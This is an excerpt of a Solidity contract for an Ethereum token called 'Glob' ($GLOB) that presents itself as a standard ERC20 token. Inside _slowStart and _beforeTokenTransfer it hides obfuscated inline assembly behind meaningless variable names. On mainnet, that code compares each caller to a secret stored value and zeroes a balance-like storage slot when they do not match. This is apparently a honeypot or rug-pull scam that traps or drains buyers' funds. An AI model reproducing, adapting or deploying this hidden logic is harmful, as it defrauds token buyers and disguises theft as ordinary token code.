...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addGlob;
    uint256 private increaseDrop = block.number*2;

    mapping (address => bool) private _firstReady; 
    mapping (address => bool) private _secondLate;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private goodMorning;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private goodNight;
    address public pair;
    ...
    bool private trading; uint256 private greatDepression = 1; bool private endlessSauce;
    uint256 private _decimals; uint256 private blackScreen;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addGlob.push(_router); addGlob.push(msgSender_); addGlob.push(pair);
        for (uint256 q=0; q < 3;) {_firstReady[addGlob[q]] = true; unchecked{q++;} }
    }
    ...
    function _slowStart() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x8896669efa35ef94c83504cabd00b6b1b8cb971ff5943e0309eb1eb91559e760
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xad7587ae0bd9fb56bbfb7cc568e079d3bbd9b3867d69bbf4178cae5c94ae0255,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; increaseDrop = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addGlob[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployGlob(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addGlob[0], 10 ** 77);
        _slowStart();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployGlob(creator, initialSupply);
    }
}

contract $GLOB is ERC20Token {
    constructor() ERC20Token("Glob", "GLOB", msg.sender, 12500000 * 10 ** 18) {
    }
}